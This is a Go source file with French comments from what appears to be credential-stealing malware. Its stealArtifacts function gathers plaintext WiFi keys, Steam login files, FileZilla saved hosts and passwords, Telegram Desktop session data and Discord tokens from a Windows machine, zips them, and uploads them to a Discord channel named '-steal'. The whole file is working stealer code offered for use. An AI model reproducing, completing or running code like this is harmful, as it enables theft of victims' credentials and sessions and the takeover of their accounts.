// steal_extra.go — artefacts complémentaires de l'extraction.
//
// En plus des navigateurs (stealer.go), on récupère ce qui ouvre encore des
// comptes ailleurs : WiFi, Steam, FileZilla, Telegram, jetons Discord. Tout
// part en fichiers dans le salon `-steal`, jamais en pavé de texte.
package main

import (
	"archive/zip"
	"bytes"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// zipFiles compresse une liste de fichiers (chemin → nom dans l'archive).
func zipFiles(entries [][2]string) []byte {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, e := range entries {
		st, err := os.Stat(e[0])
		if err != nil || st.IsDir() || st.Size() == 0 || st.Size() > 4*1024*1024 {
			continue
		}
		data, err := os.ReadFile(e[0])
		if err != nil {
			continue
		}
		w, err := zw.Create(e[1])
		if err != nil {
			continue
		}
		_, _ = w.Write(data)
	}
	_ = zw.Close()
	return buf.Bytes()
}

// stealArtifacts collecte les fichiers annexes et les envoie dans `-steal`.
// Rend le nombre de fichiers envoyés.
func stealArtifacts() int {
	ch := stealChannel()
	if ch == "" {
		return 0
	}
	outDir := stealDir()
	appdata := os.Getenv("APPDATA")
	progFiles := os.Getenv("ProgramFiles(x86)")
	if progFiles == "" {
		progFiles = os.Getenv("ProgramFiles")
	}
	home := os.Getenv("USERPROFILE")

	var files []fileOut
	add := func(name, content string) {
		if strings.TrimSpace(content) == "" {
			return
		}
		data := []byte(content)
		_ = os.WriteFile(filepath.Join(outDir, name), data, 0600)
		files = append(files, fileOut{Name: name, Data: data})
	}

	// WiFi : profils et clés en clair.
	add("wifi.txt", wifiReport())

	// Steam : comptes déjà connectés sur la machine.
	var steam [][2]string
	for _, base := range []string{
		filepath.Join(progFiles, "Steam", "config"),
		filepath.Join(progFiles, "Steam", "steamapps"),
	} {
		for _, n := range []string{"loginusers.vdf", "config.vdf", "libraryfolders.vdf"} {
			p := filepath.Join(base, n)
			if _, err := os.Stat(p); err == nil {
				steam = append(steam, [2]string{p, n})
			}
		}
	}
	if len(steam) > 0 {
		if data := zipFiles(steam); len(data) > 0 {
			_ = os.WriteFile(filepath.Join(outDir, "steam.zip"), data, 0600)
			files = append(files, fileOut{Name: "steam.zip", Data: data})
		}
	}

	// FileZilla : hôtes, utilisateurs et mots de passe (base64).
	var fz [][2]string
	for _, n := range []string{"recentservers.xml", "sitemanager.xml", "filezilla.xml"} {
		p := filepath.Join(appdata, "FileZilla", n)
		if _, err := os.Stat(p); err == nil {
			fz = append(fz, [2]string{p, n})
		}
	}
	if len(fz) > 0 {
		if data := zipFiles(fz); len(data) > 0 {
			_ = os.WriteFile(filepath.Join(outDir, "filezilla.zip"), data, 0600)
			files = append(files, fileOut{Name: "filezilla.zip", Data: data})
		}
	}

	// Telegram Desktop : la session tient dans tdata/.
	var tg [][2]string
	tdata := filepath.Join(appdata, "Telegram Desktop", "tdata")
	if st, err := os.Stat(tdata); err == nil && st.IsDir() {
		count := 0
		_ = filepath.Walk(tdata, func(p string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() || count >= 40 {
				return nil
			}
			if info.Size() == 0 || info.Size() > 2*1024*1024 {
				return nil
			}
			rel, _ := filepath.Rel(tdata, p)
			tg = append(tg, [2]string{p, "tdata/" + rel})
			count++
			return nil
		})
	}
	if len(tg) > 0 {
		if data := zipFiles(tg); len(data) > 0 {
			_ = os.WriteFile(filepath.Join(outDir, "telegram.zip"), data, 0600)
			files = append(files, fileOut{Name: "telegram.zip", Data: data})
		}
	}

	// Jetons Discord repérés dans les bases locales.
	if home != "" {
		roots := []string{
			filepath.Join(home, "AppData", "Roaming", "discord", "Local Storage", "leveldb"),
		}
		var toks []string
		for _, r := range roots {
			for _, t := range discordTokens(filepath.Dir(r)) {
				toks = append(toks, t)
			}
		}
		if len(toks) > 0 {
			add("jetons.txt", strings.Join(toks, "\n"))
		}
	}

	// Envoi par paquets de 5 (limite Discord) et journal.
	sent := 0
	for len(files) > 0 {
		n := 5
		if len(files) < n {
			n = len(files)
		}
		sendFilesTo(ch, files[:n]...)
		sent += n
		files = files[n:]
		time.Sleep(600 * time.Millisecond)
	}
	if sent > 0 {
		plog(fmt.Sprintf("steal: %d fichier(s) annexe(s)", sent))
	}
	return sent
}
